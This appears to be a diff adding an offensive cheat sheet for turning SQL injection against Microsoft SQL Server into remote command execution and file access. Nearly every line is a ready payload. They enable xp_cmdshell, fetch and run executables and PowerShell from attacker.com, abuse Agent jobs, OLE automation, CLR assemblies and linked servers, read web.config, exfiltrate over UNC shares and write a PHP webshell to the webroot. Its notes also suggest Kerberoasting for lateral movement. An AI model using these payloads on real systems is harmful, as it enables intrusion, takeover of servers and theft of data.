@@ -1,0 +1,67 @@
+# MSSQL -> RCE / FILE SYSTEM (full chain)
+# Requires stacked queries (error in driver "batch timeout" usually means attempts blocked).
+# Chain order: 1) get command exec 2) prove whoami 3) escalate to agent/CLR if not already
+# 4) read files 5) drop webshell or proxy.
+
+## 1) Enable xp_cmdshell (SQL 2005+ need sp_configure dance)
+1'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE-- -
+1'; EXEC master..xp_cmdshell 'whoami'-- -
+# Verify:
+1'; EXEC xp_cmdshell 'whoami'-- -
+
+## 2) Direct xp_cmdshell (already enabled / legacy)
+1'; EXEC master..xp_cmdshell 'whoami'-- -
+1'; EXEC xp_cmdshell 'ping -n 5 127.0.0.1'-- -     # time-delay proof
+1'; EXEC xp_cmdshell 'cmd /c whoami > C:\inetpub\wwwroot\w.txt'-- -
+1'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe'-- -
+1'; EXEC xp_cmdshell 'powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/rev.ps1")'-- -
+
+## 3) SQL Server Agent job (xp_cmdshell lacking/disabled-but-sa)
+1'; EXEC msdb.dbo.sp_add_job @job_name='pwn', @enabled=1-- -
+1'; EXEC msdb.dbo.sp_add_jobstep @job_name='pwn',@step_name='s',@subsystem='CmdExec',@command='whoami>C:\inetpub\wwwroot\w.txt'-- -
+1'; EXEC msdb.dbo.sp_start_job 'pwn'-- -
+
+## 4) OLE Automation (xp_cmdshell off, 'Ole Automation Procedures' on)
+1'; EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE-- -
+1'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c whoami>C:\inetpub\wwwroot\w.txt'-- -
+1'; DECLARE @o INT; EXEC sp_OACreate 'MSXML2.XMLHTTP',@o OUT; EXEC sp_OAMethod @o,'open',NULL,'GET','http://attacker.com/',false; EXEC sp_OAMethod @o,'send'-- -
+
+## 5) CLR / .NET assembly (SQL 2008+ full)
+# 1) Build C# DLL: void Main() { cmd /c ... } 2) CREATE ASSEMBLY, CREATE PROC, EXEC
+1'; CREATE ASSEMBLY pwn FROM 0x<HEXDLL> WITH PERMISSION_SET = UNSAFE-- -
+1'; CREATE PROCEDURE do_it AS EXTERNAL NAME pwn.Utils.Main-- -
+1'; EXEC do_it-- -
+
+## 6) SQLi -> RCE via linked server (sa + 2000-2014 common)
+1'; EXEC sp_addlinkedserver 'srv','SQLOLEDB','target\instance'-- -
+1'; EXEC('EXEC xp_cmdshell ''whoami''') AT srv-- -
+
+## 7) File read withOUT command exec (OPENROWSET BULK)
+1'; SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS t-- -
+1' UNION SELECT NULL,data FROM OPENROWSET(BULK N'C:\windows\win.ini', SINGLE_CLOB) AS t-- -
+# UNC share read (exfil faster):
+1'; SELECT * FROM OPENROWSET(BULK N'\\attacker.com\share\file', SINGLE_CLOB) AS t-- -
+
+## 8) SQL Server dbo-level file write (xp_save + sp_OAScript dir)
+1'; EXEC xp_cmdShell 'echo <php code > C:\inetpub\wwwroot\s.php'-- -
+# Better: OLE to write content with quotes intact via BCP TVP:
+1'; EXEC master..xp_cmdshell 'echo ^<?php system($_GET[1]); ?^> > C:\inetpub\wwwroot\s.php'-- -
+
+## 9) sqlcmd sidecar (when stacked blocked - use OS shell VIA the DB tool)
+# Off-box: sqlcmd -S 'server\xp_cmdshell' -Q "EXEC master..xp_cmdshell 'whoami'"
+# In-band tunnel: use xp_cmdshell to proxy a reverse through trusted host:
+1'; EXEC xp_cmdshell 'curl -k https://attacker.com/p -o C:\Windows\Temp\p.exe'-- -
+1'; EXEC xp_cmdshell 'C:\Windows\Temp\p.exe'-- -
+
+## 10) MSSQL Service Account -> SYSTEM (Windows service trust)
+# If MSSQL runs NT AUTHORITY\SYSTEM (sqlservr default on install) you ALREADY rule.
+# If LOCAL SERVICE -> try token impersonation via OLE:
+1'; DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell',@o OUT; EXEC sp_OAMethod @o,'Run',NULL,'cmd /c "whoami /priv" > C:\inetpub\wwwroot\p.txt'-- -
+# Check proc privs:
+1'; SELECT * FROM sys.server_principals WHERE name=SYSTEM_USER-- -
+
+## 11) Attack chain notes
+# - Always check extended proc PRESENCE first: EXEC master.dbo.xp_dirtree 'C:\',1 - if error the proc is intact.
+# - Kerberoast the service account for lateral movement later.
+# - xp_cmdshell output leaks to error or no output on blind - redirect to webroot & fetch it.
+# Lab: PortSwigger "stacked queries + xp_cmdshell" lab covers 1 + 2 directly.
